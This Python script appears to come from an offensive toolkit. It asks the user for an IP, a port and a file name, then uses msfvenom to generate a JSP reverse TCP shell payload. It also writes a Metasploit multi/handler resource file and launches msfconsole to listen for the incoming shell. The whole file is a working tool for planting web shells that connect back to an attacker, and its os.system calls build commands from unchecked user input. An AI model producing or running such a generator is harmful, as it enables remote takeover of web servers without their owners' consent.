import os

#GeerxOS on github!

def jsp():
    os.system("clear")
    os.system("figlet -f banner JSP ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'java/jsp_shell_reverse_tcp'
    format= 'raw'
    ext= '.jsp'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> jsp.rb")
    os.system("echo 'set payload "+payload+"' >> jsp.rb")
    os.system("echo 'set lhost "+ip+"' >> jsp.rb")
    os.system("echo 'set lport "+port+"' >> jsp.rb")
    os.system("echo 'exploit' >> jsp.rb")
    os.system("gnome-terminal -- msfconsole -r jsp.rb &")
    input("Press enter")
    os.system("clear")